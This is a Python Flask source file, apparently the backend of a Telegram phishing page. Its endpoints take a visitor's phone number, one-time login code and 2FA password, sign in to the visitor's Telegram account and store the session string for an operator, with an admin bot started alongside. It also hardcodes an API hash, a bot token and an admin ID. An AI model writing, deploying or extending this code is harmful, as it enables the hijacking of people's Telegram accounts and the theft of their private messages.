import os
import json
import asyncio
import logging
import time
import threading
import subprocess
import sys
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from session_manager import SessionManager

# ============================================================
# КОНФИГ
# ============================================================
API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]

# ============================================================
# ЛОГИ
# ============================================================
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/app.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK
# ============================================================
app = Flask(__name__, template_folder="templates")

# ============================================================
# МЕНЕДЖЕР СЕССИЙ
# ============================================================
session_manager = SessionManager()
session_manager.configure(API_ID, API_HASH)

# ============================================================
# ХРАНИЛИЩЕ
# ============================================================
pending_auth = {}
rate_limiter = {}

def check_rate_limit(ip: str) -> bool:
    now = time.time()
    if ip in rate_limiter:
        if now - rate_limiter[ip] < 2.0:
            return False
    rate_limiter[ip] = now
    return True

# ============================================================
# МАРШРУТЫ
# ============================================================
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/auth/send", methods=["POST"])
def send_code():
    data = request.json
    ip = request.remote_addr
    
    if not check_rate_limit(ip):
        return jsonify({"status": "error", "message": "Too many attempts"}), 429
    
    phone = data.get("phone", "").strip()
    if not phone or len(phone) < 10:
        return jsonify({"status": "error", "message": "Invalid phone"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            pending_auth[phone] = {"client": client, "step": "code_sent"}
            logger.info(f"Code sent to {phone}")
            return {"status": "ok", "message": "Code sent"}
        except errors.FloodWaitError as e:
            return {"status": "error", "message": f"Wait {e.seconds}s"}
        except errors.PhoneNumberInvalidError:
            return {"status": "error", "message": "Invalid phone"}
        except Exception as e:
            logger.error(f"Send error: {e}")
            return {"status": "error", "message": str(e)}
    
    result = loop.run_until_complete(send())
    loop.close()
    
    if result["status"] == "ok":
        return jsonify(result)
    return jsonify(result), 400

@app.route("/api/auth/verify", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    password = data.get("password", "").strip()
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Fill all fields"}), 400
    
    if phone not in pending_auth:
        return jsonify({"status": "error", "message": "Request code first"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def verify():
        client = pending_auth[phone].get("client")
        if not client:
            return {"status": "error", "message": "Client not found"}
        
        try:
            await client.sign_in(phone, code)
            if password:
                await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                me = await client.get_me()
                session_string = client.session.save()
                session_manager.save_session(phone, session_string)
                del pending_auth[phone]
                return {
                    "status": "ok",
                    "message": "Access granted",
                    "user": {"id": me.id, "username": me.username, "phone": me.phone}
                }
            return {"status": "error", "message": "Auth failed"}
        except errors.SessionPasswordNeededError:
            return {"status": "error", "message": "2FA required"}
        except errors.PhoneCodeInvalidError:
            return {"status": "error", "message": "Invalid code"}
        except errors.PhoneCodeExpiredError:
            return {"status": "error", "message": "Code expired"}
        except Exception as e:
            logger.error(f"Verify error: {e}")
            return {"status": "error", "message": str(e)}
    
    result = loop.run_until_complete(verify())
    loop.close()
    
    if result["status"] == "ok":
        return jsonify(result)
    return jsonify(result), 400

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

# ============================================================
# ЗАПУСК АДМИН-БОТА ЧЕРЕЗ SUBPROCESS
# ============================================================
def run_admin_bot():
    """Запускает admin_bot.py как отдельный процесс"""
    try:
        time.sleep(3)
        logger.info("Starting admin bot via subprocess...")
        subprocess.Popen(
            [sys.executable, "admin_bot.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.path.dirname(os.path.abspath(__file__))
        )
        logger.info("Admin bot subprocess started")
    except Exception as e:
        logger.error(f"Failed to start admin bot: {e}")

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    # Запускаем админ-бота в фоне
    bot_thread = threading.Thread(target=run_admin_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)